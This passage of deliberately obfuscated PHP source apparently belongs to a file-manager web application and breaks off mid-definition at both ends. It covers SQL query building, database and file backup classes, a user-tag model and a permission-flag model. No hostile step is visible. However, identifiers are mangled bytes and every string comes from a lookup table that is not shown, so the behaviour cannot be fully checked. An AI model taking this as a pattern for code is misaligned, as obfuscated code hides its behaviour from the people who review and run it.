$this->parseWhere(!empty($¯É‡É[$Õæ¤¾ı©[364]]) ? $¯É‡É[$Õæ¤¾ı©[364]] : $Õæ¤¾ı©[12]) . $this->parseOrder(!empty($¯É‡É[$Õæ¤¾ı©[452]]) ? $¯É‡É[$Õæ¤¾ı©[452]] : $Õæ¤¾ı©[12]) . $this->parseLimit(!empty($¯É‡É[$Õæ¤¾ı©[379]]) ? $¯É‡É[$Õæ¤¾ı©[379]] : $Õæ¤¾ı©[12]) . $this->parseLock(isset($¯É‡É[$Õæ¤¾ı©[915]]) ? $¯É‡É[$Õæ¤¾ı©[915]] : !1) . $this->parseComment(!empty($¯É‡É[$Õæ¤¾ı©[440]]) ? $¯É‡É[$Õæ¤¾ı©[440]] : $Õæ¤¾ı©[12]); return $this->execute($¾¯†¶Ğ„, $this->parseBind(!empty($¯É‡É[$Õæ¤¾ı©[372]]) ? $¯É‡É[$Õæ¤¾ı©[372]] : array())); } public function select($Ï”÷­¿ = array()) { $Ÿ±»ã–« =& $_SERVER[äô®•½Â]; $this->model = $Ï”÷­¿[$Ÿ±»ã–«[370]]; $’çµµ¼” = $this->buildSelectSql($Ï”÷­¿); $™‚‰Î÷ = isset($Ï”÷­¿[$Ÿ±»ã–«[435]]) ? $Ï”÷­¿[$Ÿ±»ã–«[435]] : !1; if ($™‚‰Î÷) { $Îö¹‘€ = is_string($™‚‰Î÷[$Ÿ±»ã–«[97]]) ? $™‚‰Î÷[$Ÿ±»ã–«[97]] : $Ÿ±»ã–«[1115] . md5($’çµµ¼”); $®õ¤¤ç® = think_cache($Îö¹‘€, $Ÿ±»ã–«[12], $™‚‰Î÷); if (!1 !== $®õ¤¤ç®) { return $®õ¤¤ç®; } } $áü¡™‹å = $this->query($’çµµ¼”, $this->parseBind(!empty($Ï”÷­¿[$Ÿ±»ã–«[372]]) ? $Ï”÷­¿[$Ÿ±»ã–«[372]] : array())); if ($™‚‰Î÷ && !1 !== $áü¡™‹å) { think_cache($Îö¹‘€, $áü¡™‹å, $™‚‰Î÷); } return $áü¡™‹å; } public function buildSelectSql($‚†â§à = array()) { $ÃĞùúªá =& $_SERVER[äô®•½Â]; if (isset($‚†â§à[$ÃĞùúªá[439]])) { if (strpos($‚†â§à[$ÃĞùúªá[439]], $ÃĞùúªá[50])) { list($—êÍ©Ä², $§Ñ°¸èÄ) = explode($ÃĞùúªá[50], $‚†â§à[$ÃĞùúªá[439]]); } else { $—êÍ©Ä² = $‚†â§à[$ÃĞùúªá[439]]; } $—êÍ©Ä² = $—êÍ©Ä² ? $—êÍ©Ä² : 1; $§Ñ°¸èÄ = isset($§Ñ°¸èÄ) ? $§Ñ°¸èÄ : (is_numeric($‚†â§à[$ÃĞùúªá[379]]) ? $‚†â§à[$ÃĞùúªá[379]] : 20); $ŸÃªş§ = $§Ñ°¸èÄ * ((int) $—êÍ©Ä² - 1); $‚†â§à[$ÃĞùúªá[379]] = $ŸÃªş§ . $ÃĞùúªá[50] . $§Ñ°¸èÄ; } if (think_config($ÃĞùúªá[1116])) { $©´¯¦œ£ = $ÃĞùúªá[1117] . md5(serialize($‚†â§à)); $àµñÕ = think_cache($©´¯¦œ£); if ($àµñÕ) { return $àµñÕ; } } $éÎ¶íã = $this->parseSql($this->selectSql, $‚†â§à); $éÎ¶íã .= $this->parseLock(isset($‚†â§à[$ÃĞùúªá[915]]) ? $‚†â§à[$ÃĞùúªá[915]] : !1); if (isset($©´¯¦œ£)) { think_cache($©´¯¦œ£, $éÎ¶íã); } return $éÎ¶íã; } public function parseSql($Ò§Óõò‚, $ı£õ¬‚¥ = array()) { $í•™Ïá² =& $_SERVER[äô®•½Â]; $Ò§Óõò‚ = str_replace(array($í•™Ïá²[1118], $í•™Ïá²[1119], $í•™Ïá²[1120], $í•™Ïá²[1121], $í•™Ïá²[1122], $í•™Ïá²[1123], $í•™Ïá²[1124], $í•™Ïá²[1125], $í•™Ïá²[1126], $í•™Ïá²[1127], $í•™Ïá²[1128]), array($this->parseTable("{$ı£õ¬‚¥[$í•™Ïá²[368]]}"), $this->parseDistinct(isset($ı£õ¬‚¥[$í•™Ïá²[1129]]) ? $ı£õ¬‚¥[$í•™Ïá²[1129]] : !1), $this->parseField(!empty($ı£õ¬‚¥[$í•™Ïá²[362]]) ? $ı£õ¬‚¥[$í•™Ïá²[362]] : $í•™Ïá²[223]), $this->parseJoin(!empty($ı£õ¬‚¥[$í•™Ïá²[371]]) ? $ı£õ¬‚¥[$í•™Ïá²[371]] : $í•™Ïá²[12]), $this->parseWhere(!empty($ı£õ¬‚¥[$í•™Ïá²[364]]) ? $ı£õ¬‚¥[$í•™Ïá²[364]] : $í•™Ïá²[12]), $this->parseGroup(!empty($ı£õ¬‚¥[$í•™Ïá²[591]]) ? $ı£õ¬‚¥[$í•™Ïá²[591]] : $í•™Ïá²[12]), $this->parseHaving(!empty($ı£õ¬‚¥[$í•™Ïá²[1130]]) ? $ı£õ¬‚¥[$í•™Ïá²[1130]] : $í•™Ïá²[12]), $this->parseOrder(!empty($ı£õ¬‚¥[$í•™Ïá²[452]]) ? $ı£õ¬‚¥[$í•™Ïá²[452]] : $í•™Ïá²[12]), $this->parseLimit(!empty($ı£õ¬‚¥[$í•™Ïá²[379]]) ? $ı£õ¬‚¥[$í•™Ïá²[379]] : $í•™Ïá²[12]), $this->parseUnion(!empty($ı£õ¬‚¥[$í•™Ïá²[433]]) ? $ı£õ¬‚¥[$í•™Ïá²[433]] : $í•™Ïá²[12]), $this->parseComment(!empty($ı£õ¬‚¥[$í•™Ïá²[440]]) ? $ı£õ¬‚¥[$í•™Ïá²[440]] : $í•™Ïá²[12])), $Ò§Óõò‚); return $Ò§Óõò‚; } public function getLastSql($€òïÕ± = '') { return $€òïÕ± ? $this->modelSql[$€òïÕ±] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($Ôê€ û¼) { return addslashes($Ôê€ û¼); } public function setModel($Šö’Óùš) { $this->model = $Šö’Óùš; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto AãŠ“àÑ›é; fÕƒ¤íŞ…: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[äô®•½Â][813]); $this->init(); $this->keep(); } public function init() { $†ˆşƒÒî =& $_SERVER[äô®•½Â]; $this->isManual(); self::$name = date($†ˆşƒÒî[814]); if (!($˜˜Ôçú¦ = $this->model->lastItem())) { $˜˜Ôçú¦ = $this->initData(); } else { self::$name = $˜˜Ôçú¦[$†ˆşƒÒî[32]]; if ($˜˜Ôçú¦[$†ˆşƒÒî[815]] == $†ˆşƒÒî[91]) { self::$name = date($†ˆşƒÒî[262]); $¦´Í¤¸ï = intval(_get($˜˜Ôçú¦, $†ˆşƒÒî[816], 0)); if (self::$manual == 0 && $˜˜Ôçú¦[$†ˆşƒÒî[32]] == self::$name) { $this->model->remove($˜˜Ôçú¦[$†ˆşƒÒî[486]]); } $˜˜Ôçú¦ = $this->initData($¦´Í¤¸ï, $˜˜Ôçú¦[$†ˆşƒÒî[817]]); } else { $this->checkStore($˜˜Ôçú¦[$†ˆşƒÒî[817]]); } } self::$option = $˜˜Ôçú¦; } private function isManual() { $ÕŠóŒêğ = _get($GLOBALS, $_SERVER[äô®•½Â][818], 0); $ÕŠóŒêğ = intval($ÕŠóŒêğ); self::$manual = $ÕŠóŒêğ && $ÕŠóŒêğ == 1 ? 1 : 0; } private function initData($ÉÚËó¼ä = 0, $£ùø×ÙŞ = '') { $¬ô €§¢ =& $_SERVER[äô®•½Â]; $ÌšôÚíŞ = $this->model->config(); if ($£ùø×ÙŞ && $ÌšôÚíŞ[$¬ô €§¢[817]] != $£ùø×ÙŞ) { $ÉÚËó¼ä = 0; } $this->checkStore($ÌšôÚíŞ[$¬ô €§¢[817]]); if (self::$manual == 1) { self::$name .= $¬ô €§¢[11] . date($¬ô €§¢[819]); } $ñ„¥º²‘ = array($¬ô €§¢[817] => $ÌšôÚíŞ[$¬ô €§¢[817]], $¬ô €§¢[32] => self::$name, $¬ô €§¢[815] => 0, $¬ô €§¢[171] => $ÌšôÚíŞ[$¬ô €§¢[171]], $¬ô €§¢[820] => self::$manual, $¬ô €§¢[821] => array($¬ô €§¢[822] => array($¬ô €§¢[815] => 0), $¬ô €§¢[823] => array($¬ô €§¢[815] => 0, $¬ô €§¢[824] => 0, $¬ô €§¢[825] => 0, $¬ô €§¢[33] => $¬ô €§¢[12], $¬ô €§¢[826] => 0, $¬ô €§¢[827] => 0), $¬ô €§¢[828] => array($¬ô €§¢[815] => 0, $¬ô €§¢[824] => 0, $¬ô €§¢[825] => 0, $¬ô €§¢[826] => 0, $¬ô €§¢[827] => 0), $¬ô €§¢[233] => array($¬ô €§¢[815] => 0, $¬ô €§¢[829] => 0, $¬ô €§¢[830] => 0, $¬ô €§¢[831] => 0, $¬ô €§¢[832] => 0, $¬ô €§¢[554] => $ÉÚËó¼ä, $¬ô €§¢[826] => 0, $¬ô €§¢[827] => 0)), $¬ô €§¢[826] => time(), $¬ô €§¢[827] => 0); $Á ¥†â = $this->model->insert($ñ„¥º²‘); $ñ„¥º²‘[$¬ô €§¢[486]] = $Á ¥†â; return $ñ„¥º²‘; } private function checkStore($„”äš½×) { $Ô”á‰Ç– = Model($_SERVER[äô®•½Â][833]); $“ßó½Ÿ“ = $Ô”á‰Ç–->listData($„”äš½×); $Ô”á‰Ç–->checkConfig($“ßó½Ÿ“); } public static function get() { if (!self::$option) { $¯ù–ç‚¿ = Model($_SERVER[äô®•½Â][813]); $º„—€òø = $¯ù–ç‚¿->findByName(self::$name); $¯ù–ç‚¿->parseContent($º„—€òø); self::$option = $º„—€òø; } return self::$option; } public static function set($©Ó‚çã¼) { $ÅõçÇª³ =& $_SERVER[äô®•½Â]; $æ´‚Ö÷– = self::get(); foreach ($©Ó‚çã¼ as $¢ùÎ¿æğ => $¶„”­‰Ê) { array_set_value($æ´‚Ö÷–, $¢ùÎ¿æğ, $¶„”­‰Ê); } Model($ÅõçÇª³[813])->update($æ´‚Ö÷–[$ÅõçÇª³[486]], $æ´‚Ö÷–); self::$option = $æ´‚Ö÷–; return self::$option; } public function keep() { $Ş‡¶ìôÉ =& $_SERVER[äô®•½Â]; $©•¢¥Ÿ¼ = self::get(); if (_get($©•¢¥Ÿ¼, $Ş‡¶ìôÉ[834], 0) == $Ş‡¶ìôÉ[91]) { return; } $this->backupKeep($©•¢¥Ÿ¼); self::set(array($Ş‡¶ìôÉ[834] => 1)); } private function backupKeep($Ï øï) { $çõ¸àéÓ =& $_SERVER[äô®•½Â]; if (self::$manual == 1) { return; } $÷Õ„²Ì = $this->model->listData(); if (empty($÷Õ„²Ì)) { return; } $‘·¸Ààí = 0; $‡š¬ÙÔ = array(); foreach ($÷Õ„²Ì as $åõ›™) { if ($‘·¸Ààí >= 7) { break; } $‡š¬ÙÔ[] = $åõ›™[$çõ¸àéÓ[32]]; $‘·¸Ààí++; } for ($‘·¸Ààí = 0; $‘·¸Ààí < 12; $‘·¸Ààí++) { $‡š¬ÙÔ[] = date($çõ¸àéÓ[835], strtotime("\x2d{$‘·¸Ààí}\x20\155\x6f\x6e\164\x68\x73")); } $‡š¬ÙÔ = array_unique($‡š¬ÙÔ); $À“™¶‰ù = Model($çõ¸àéÓ[836])->get($çõ¸àéÓ[837]); foreach ($÷Õ„²Ì as $åõ›™) { if (isset($åõ›™[$çõ¸àéÓ[820]]) && $åõ›™[$çõ¸àéÓ[820]] == $çõ¸àéÓ[91]) { continue; } if (!empty($åõ›™[$çõ¸àéÓ[32]]) && in_array($åõ›™[$çõ¸àéÓ[32]], $‡š¬ÙÔ)) { continue; } $this->model->remove($åõ›™[$çõ¸àéÓ[486]]); $Üè´áàç = $this->backupPath($Ï øï, $À“™¶‰ù); IO::remove($Üè´áàç, !1); } } private function backupPath($®²’ÀÆá, $â³İ¼ß» = false) { $¦ğ½ğæÑ =& $_SERVER[äô®•½Â]; if (!$â³İ¼ß») { $â³İ¼ß» = Model($¦ğ½ğæÑ[836])->get($¦ğ½ğæÑ[837]); } $¬›ø¶· = $®²’ÀÆá[$¦ğ½ğæÑ[32]]; $Üš·Ë = substr(md5($¦ğ½ğæÑ[838] . $â³İ¼ß» . $¬›ø¶·), 0, 8); return "\173\x69\x6f\72{$®²’ÀÆá[$¦ğ½ğæÑ[817]]}\x7d\57\144\x61\x74\141\x62\141\163\145\x2f\142\141\143\153\165\x70\x2f" . $¬›ø¶· . $¦ğ½ğæÑ[11] . $Üš·Ë; } public function db() { $§ßÇü¢× =& $_SERVER[äô®•½Â]; $¤ìåàÑË = self::get(); if (_get($¤ìåàÑË, $§ßÇü¢×[839], 0) == $§ßÇü¢×[91]) { return !0; } $®Ñ‡·ª¡ = new BackupDb(); if (!$®Ñ‡·ª¡->index()) { return !1; } self::set(array($§ßÇü¢×[839] => 1)); return !0; } public function dbFile() { $àÂèëÅÌ =& $_SERVER[äô®•½Â]; $ÚäøÕé = self::get(); if (_get($ÚäøÕé, $àÂèëÅÌ[840], 0) == $àÂèëÅÌ[91]) { return !0; } $ß³êÕ = new BackupDbFile(); if (!$ß³êÕ->index()) { return !1; } self::set(array($àÂèëÅÌ[840] => 1)); return !0; } public function file() { $‚ºøä¼¼ =& $_SERVER[äô®•½Â]; $¨Ÿ£¦Ş¸ = self::get(); if (_get($¨Ÿ£¦Ş¸, $‚ºøä¼¼[841], 0) == $‚ºøä¼¼[91]) { return !0; } if ($¨Ÿ£¦Ş¸[$‚ºøä¼¼[171]] == $‚ºøä¼¼[842]) { $Â‰ñÍÑÌ = new BackupFile(); if (!$Â‰ñÍÑÌ->index()) { return !1; } } self::set(array($‚ºøä¼¼[841] => 1, $‚ºøä¼¼[815] => 1)); return !0; } public static function log($”ø¼) { write_log($”ø¼, $_SERVER[äô®•½Â][843]); } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ù»°¶Ëš =& $_SERVER[äô®•½Â]; $áÇ„«íÕ = Backup::get(); self::$io = $áÇ„«íÕ[$ù»°¶Ëš[817]]; self::$name = $áÇ„«íÕ[$ù»°¶Ëš[32]]; $Î«¹™á = new DbManage(); $¯®è§È  = $Î«¹™á->dbType(); $×¥¸¡Ñ‹ = array($ù»°¶Ëš[844] => $¯®è§È , $ù»°¶Ëš[845] => time()); Backup::set($×¥¸¡Ñ‹); $¡—êúí€ = $this->tmpFilesPath() . $ù»°¶Ëš[846] . self::$name . $ù»°¶Ëš[8]; del_dir($¡—êúí€); mk_dir($¡—êúí€); $ıÖÍÆ‹ƒ = $ñ¯òœóı = 0; try { $›»Ëßôæ = $Î«¹™á->db()->getTables(); } catch (Exception $¡—ş) { Backup::log($ù»°¶Ëš[847] . $¡—ş->getMessage()); return !1; } $›»Ëßôæ = array_diff($›»Ëßôæ, array($ù»°¶Ëš[848], $ù»°¶Ëš[849])); foreach ($›»Ëßôæ as $ÎÉÏé) { if ($ÎÉÏé == $ù»°¶Ëš[850]) { continue; } $ıÖÍÆ‹ƒ += $Î«¹™á->model($ÎÉÏé)->count(); } $¾¼æ¥Òµ = new Task($ù»°¶Ëš[851], $ù»°¶Ëš[843], $ıÖÍÆ‹ƒ, LNG($ù»°¶Ëš[852]) . $ù»°¶Ëš[853] . LNG($ù»°¶Ëš[854])); $GLOBALS[$ù»°¶Ëš[855]] = self::$name; foreach ($›»Ëßôæ as $ÎÉÏé) { $äìØ×İ¦ = $¡—êúí€ . $ÎÉÏé . $ù»°¶Ëš[856]; if ($ÎÉÏé == $ù»°¶Ëš[850]) { @touch($äìØ×İ¦); continue; } $÷ıÈ£º = null; if ($ÎÉÏé == $ù»°¶Ëš[857] && $áÇ„«íÕ[$ù»°¶Ëš[171]] == $ù»°¶Ëš[842]) { $÷ıÈ£º = self::$io; } $ñ¯òœóı += $Î«¹™á->sqlFromDb($ÎÉÏé, $äìØ×İ¦, $¾¼æ¥Òµ, $÷ıÈ£º); } unset($GLOBALS[$ù»°¶Ëš[855]]); $¾¼æ¥Òµ->end(); if ($ñ¯òœóı > $ıÖÍÆ‹ƒ) { $ıÖÍÆ‹ƒ = $ñ¯òœóı; } $×¥¸¡Ñ‹ = array($ù»°¶Ëš[844] => $¯®è§È , $ù»°¶Ëš[839] => 1, $ù»°¶Ëš[858] => $ıÖÍÆ‹ƒ, $ù»°¶Ëš[859] => $ñ¯òœóı, $ù»°¶Ëš[860] => time()); Backup::set($×¥¸¡Ñ‹); if ($ıÖÍÆ‹ƒ - $ñ¯òœóı > 0) { $íÅñì¼Â = $ù»°¶Ëš[861]; if (!stristr(I18n::getType(), $ù»°¶Ëš[862])) { $íÅñì¼Â = $ù»°¶Ëš[863]; } Backup::log(array($íÅñì¼Â, $×¥¸¡Ñ‹)); return !1; } return !0; } private function tmpFilesPath() { $ˆ¨úšö =& $_SERVER[äô®•½Â]; $Ùì‹ØÀ© = TEMP_FILES; if ($GLOBALS[$ˆ¨úšö[6]][$ˆ¨úšö[92]][$ˆ¨úšö[864]]) { $Ùì‹ØÀ© = $GLOBALS[$ˆ¨úšö[6]][$ˆ¨úšö[92]][$ˆ¨úšö[864]]; if (!mk_dir($Ùì‹ØÀ©) || !is_writable($Ùì‹ØÀ©) || !IO::mkfile($Ùì‹ØÀ© . $ˆ¨úšö[865])) { $Ùì‹ØÀ© = TEMP_FILES; } } return $Ùì‹ØÀ©; } } class BackupDbFile { public function __construct() { } public function index() { $°ÆÔ»‚² =& $_SERVER[äô®•½Â]; $Óòé²Ûè = Backup::get(); $¬Ä‘²õ = $Óòé²Ûè[$°ÆÔ»‚²[32]]; $òı¸‡ö• = $this->tmpFilesPath() . "\x62\141\x63\x6b\165\x70\x5f{$¬Ä‘²õ}\x2f"; $¿°€Ûçˆ = $this->backupPath($Óòé²Ûè); if (!($¿°€Ûçˆ = IO::mkdir($¿°€Ûçˆ))) { Backup::log($°ÆÔ»‚²[866] . $¿°€Ûçˆ); return !1; } $Ï¯ù›æĞ = IO::listPath($òı¸‡ö•); $ÂÛ¶Š› = isset($Ï¯ù›æĞ[$°ÆÔ»‚²[86]]) ? $Ï¯ù›æĞ[$°ÆÔ»‚²[86]] : array(); $«ŸĞÊøÖ = array_sum(array_column($ÂÛ¶Š›, $°ÆÔ»‚²[79])); if (!$«ŸĞÊøÖ) { Backup::log($°ÆÔ»‚²[867] . $òı¸‡ö•); return !1; } $øĞºÑÂ‘ = array($°ÆÔ»‚²[868] => $«ŸĞÊøÖ, $°ÆÔ»‚²[869] => time()); Backup::set($øĞºÑÂ‘); $÷±Ş‘²Ó = new TaskFileTransfer($°ÆÔ»‚²[870], $°ÆÔ»‚²[843], count($ÂÛ¶Š›), LNG($°ÆÔ»‚²[852]) . $°ÆÔ»‚²[473] . LNG($°ÆÔ»‚²[854]) . $°ÆÔ»‚²[871]); $÷±Ş‘²Ó->task[$°ÆÔ»‚²[829]] = $«ŸĞÊøÖ; foreach ($Ï¯ù›æĞ[$°ÆÔ»‚²[86]] as $Ç‡Áí¨§) { $”¥ÕªÜó = IO::move($Ç‡Áí¨§[$°ÆÔ»‚²[87]], $¿°€Ûçˆ); if (!$”¥ÕªÜó) { $÷±Ş‘²Ó->end(); $ê›êÒ·¶ = IO::getLastError($°ÆÔ»‚²[872] . $Ç‡Áí¨§[$°ÆÔ»‚²[87]] . $°ÆÔ»‚²[873] . $¿°€Ûçˆ . $°ÆÔ»‚²[178]); Backup::log($ê›êÒ·¶); return !1; } } $èÙáÙÑÉ = new DbManage(); $ƒäùÉİ = $èÙáÙÑÉ->getSqlFile(); if (!$ƒäùÉİ || !$ƒäùÉİ[$°ÆÔ»‚²[874]] || !$ƒäùÉİ[$°ÆÔ»‚²[13]]) { Backup::log($°ÆÔ»‚²[875]); return !1; } IO::move($ƒäùÉİ[$°ÆÔ»‚²[874]], $¿°€Ûçˆ); IO::move($ƒäùÉİ[$°ÆÔ»‚²[13]], $¿°€Ûçˆ); $÷±Ş‘²Ó->end(); $øĞºÑÂ‘ = array($°ÆÔ»‚²[876] => $«ŸĞÊøÖ, $°ÆÔ»‚²[877] => time()); Backup::set($øĞºÑÂ‘); return !0; } private function backupPath($‹ü¾É´‡) { $†ğûŠÕ =& $_SERVER[äô®•½Â]; $¬·èŸ–Ô = $‹ü¾É´‡[$†ğûŠÕ[32]]; $Ş°¥Ì·¸ = Model($†ğûŠÕ[836])->get($†ğûŠÕ[837]); $°ôÃæÚÅ = substr(md5($†ğûŠÕ[838] . $Ş°¥Ì·¸ . $¬·èŸ–Ô), 0, 8); return "\x7b\151\x6f\72{$‹ü¾É´‡[$†ğûŠÕ[817]]}\175\x2f\144\141\x74\141\142\x61\x73\x65\57\142\x61\143\153\165\x70\x2f" . $¬·èŸ–Ô . $†ğûŠÕ[11] . $°ôÃæÚÅ; } private function tmpFilesPath() { $Äî™ˆıÊ =& $_SERVER[äô®•½Â]; $ß…î÷é = TEMP_FILES; if ($GLOBALS[$Äî™ˆıÊ[6]][$Äî™ˆıÊ[92]][$Äî™ˆıÊ[864]]) { $ß…î÷é = $GLOBALS[$Äî™ˆıÊ[6]][$Äî™ˆıÊ[92]][$Äî™ˆıÊ[864]]; if (!mk_dir($ß…î÷é) || !is_writable($ß…î÷é) || !IO::mkfile($ß…î÷é . $Äî™ˆıÊ[865])) { $ß…î÷é = TEMP_FILES; } } return $ß…î÷é; } } goto bÓõ¬ò¨±; F¬­ÏØ×®: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\x72\56\164\141\x67\x4c\x69\163\164"; public $modelType = "\x55\x73\x65\x72\117\160\x74\151\x6f\156"; public $field = array("\x6e\141\155\x65", "\x73\164\171\154\145", "\163\x6f\162\x74"); public function listData($«—úÓ¢Ú = false, $àÁû…œ = "\x73\x6f\162\164", $áŒ€’ä½ = false) { return parent::listData($«—úÓ¢Ú, $àÁû…œ, $áŒ€’ä½); } public function remove($ö¤Ê“Æ) { return parent::remove($ö¤Ê“Æ); } public function add($º™§», $™©‚ÕŞŸ = "\154\141\142\145\154\55\x67\x72\x65\x79\x2d\x6e\x6f\x72\x6d\x61\x6c") { $äÉˆ›÷ç =& $_SERVER[äô®•½Â]; if ($this->findByName($º™§»)) { return !1; } $Ô±”¡—Ê = array($äÉˆ›÷ç[505] => $º™§», $äÉˆ›÷ç[571] => $™©‚ÕŞŸ, $äÉˆ›÷ç[1981] => $this->getSort($äÉˆ›÷ç[347]) + 1); return parent::insert($Ô±”¡—Ê); } public function update($«†ê‰öà, $Ó“‡ø÷À) { $‘™ùş£ =& $_SERVER[äô®•½Â]; $ú±Ôµô­ = $this->listData($«†ê‰öà); $»ãÕı = $this->findByName($Ó“‡ø÷À[$‘™ùş£[32]]); if (!$ú±Ôµô­ || $»ãÕı && $»ãÕı[$‘™ùş£[486]] != $ú±Ôµô­[$‘™ùş£[486]]) { return !1; } return parent::update($«†ê‰öà, $Ó“‡ø÷À); } public function moveTop($ˆÅÖßúº) { $€‘’‹„ó =& $_SERVER[äô®•½Â]; $á‰İ¤÷è = parent::listData(); $Âİ¶á–ï = $this->getSort($€‘’‹„ó[346]); foreach ($á‰İ¤÷è as &$Äñö—±Ş) { if ($Äñö—±Ş[$€‘’‹„ó[486]] == $ˆÅÖßúº) { $Äñö—±Ş[$€‘’‹„ó[2001]] = $Âİ¶á–ï; continue; } $Äñö—±Ş[$€‘’‹„ó[2001]] += 1; } unset($Äñö—±Ş); return parent::resetData($á‰İ¤÷è); } public function moveBottom($ÌÄ™Ğùù) { $ÜõµÏ£¯ =& $_SERVER[äô®•½Â]; $¯‰–§Íù = $this->getSort($ÜõµÏ£¯[347]) + 1; return parent::update($ÌÄ™Ğùù, array($ÜõµÏ£¯[2001] => $¯‰–§Íù)); } public function resetSort($¶àáÈğ) { $ãÈÂéË =& $_SERVER[äô®•½Â]; $­“ş×ëŸ = array(); $¶àáÈğ = is_array($¶àáÈğ) ? $¶àáÈğ : array(); for ($ê•¤¸Ï£ = 0; $ê•¤¸Ï£ < count($¶àáÈğ); $ê•¤¸Ï£++) { $­“ş×ëŸ[$¶àáÈğ[$ê•¤¸Ï£] . $ãÈÂéË[12]] = $ê•¤¸Ï£ + 1; } $ô”«Ãüù = parent::listData(); foreach ($ô”«Ãüù as &$óµèÚİ¿) { $àşË»è˜ = $­“ş×ëŸ[$óµèÚİ¿[$ãÈÂéË[486]]]; $óµèÚİ¿[$ãÈÂéË[2001]] = $àşË»è˜ ? $àşË»è˜ : $óµèÚİ¿[$ãÈÂéË[2001]]; } unset($óµèÚİ¿); return parent::resetData($ô”«Ãüù); } private function getSort($æ‹ÒºíÍ) { $š‚àÊÍ =& $_SERVER[äô®•½Â]; $¯ï½Ãª¶ = parent::listData(); $”Ô¶ä• = array_to_keyvalue($¯ï½Ãª¶, $š‚àÊÍ[12], $š‚àÊÍ[2001]); if (!$”Ô¶ä•) { $”Ô¶ä• = array(0); } $¥é¤å¡ = $æ‹ÒºíÍ == $š‚àÊÍ[347] ? max($”Ô¶ä•) : min($”Ô¶ä•); return intval($¥é¤å¡); } } goto DÊøó¾‡Ùã; cìØ£‘œŒ‘: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $øÂÏ´è¡ =& $_SERVER[äô®•½Â]; $’®¯Ç¶› = array(array($øÂÏ´è¡[505] => LNG($øÂÏ´è¡[1978]), $øÂÏ´è¡[1979] => $øÂÏ´è¡[1980], $øÂÏ´è¡[1981] => 1, $øÂÏ´è¡[1982] => 1, $øÂÏ´è¡[1983] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($øÂÏ´è¡[505] => LNG($øÂÏ´è¡[1984]), $øÂÏ´è¡[1979] => $øÂÏ´è¡[1985], $øÂÏ´è¡[1981] => 2, $øÂÏ´è¡[1982] => 1, $øÂÏ´è¡[1983] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($øÂÏ´è¡[505] => LNG($øÂÏ´è¡[1986]), $øÂÏ´è¡[1979] => $øÂÏ´è¡[1987], $øÂÏ´è¡[1981] => 3, $øÂÏ´è¡[1982] => 1, $øÂÏ´è¡[1983] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($øÂÏ´è¡[505] => LNG($øÂÏ´è¡[1988]), $øÂÏ´è¡[1979] => $øÂÏ´è¡[1989], $øÂÏ´è¡[1981] => 4, $øÂÏ´è¡[1982] => 1, $øÂÏ´è¡[1983] => self::AUTH_SHOW | self::AUTH_VIEW), array($øÂÏ´è¡[505] => LNG($øÂÏ´è¡[1990]), $øÂÏ´è¡[1979] => $øÂÏ´è¡[1991], $øÂÏ´è¡[1981] => 5, $øÂÏ´è¡[1982] => 1, $øÂÏ´è¡[1983] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($øÂÏ´è¡[505] => LNG($øÂÏ´è¡[1992]), $øÂÏ´è¡[1979] => $øÂÏ´è¡[1993], $øÂÏ´è¡[1981] => 6, $øÂÏ´è¡[1982] => 1, $øÂÏ´è¡[1983] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($øÂÏ´è¡[505] => LNG($øÂÏ´è¡[1994]), $øÂÏ´è¡[1979] => $øÂÏ´è¡[1995], $øÂÏ´è¡[1981] => 7, $øÂÏ´è¡[1982] => 1, $øÂÏ´è¡[1983] => 0)); return $’®¯Ç¶›; } public static function authCheck($ªûµ­ƒ, $¸´Ñİç‡) { $ÑüÊ‡êÛ =& $_SERVER[äô®•½Â]; $ªûµ­ƒ = intval($ªûµ­ƒ); if (KodUser::isRoot() && $GLOBALS[$ÑüÊ‡êÛ[6]][$ÑüÊ‡êÛ[1996]]) { return !0; } if ($ªûµ­ƒ <= 0) { return !1; } if (($ªûµ­ƒ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ªûµ­ƒ & $¸´Ñİç‡); } public static function authCheckShow($‹´”çí·) { return self::authCheck($‹´”çí·, self::AUTH_SHOW); } public static function authCheckView($™˜œñÖ´) { return self::authCheck($™˜œñÖ´, self::AUTH_VIEW); } public static function authCheckDownload($Ÿ‚ßÎ‰µ) { return self::authCheck($Ÿ‚ßÎ‰µ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ó­ø–÷) { return self::authCheck($ó­ø–÷, self::AUTH_UPLOAD); } public static function authCheckEdit($Œ©ú‰¢Ä) { return self::authCheck($Œ©ú‰¢Ä, self::AUTH_EDIT); } public static function authCheckRemove($àÁü¥úÒ) { return self::authCheck($àÁü¥úÒ, self::AUTH_REMOVE); } public static function authCheckShare($–öëèìÈ) { return self::authCheck($–öëèìÈ, self::AUTH_SHARE); } public static function 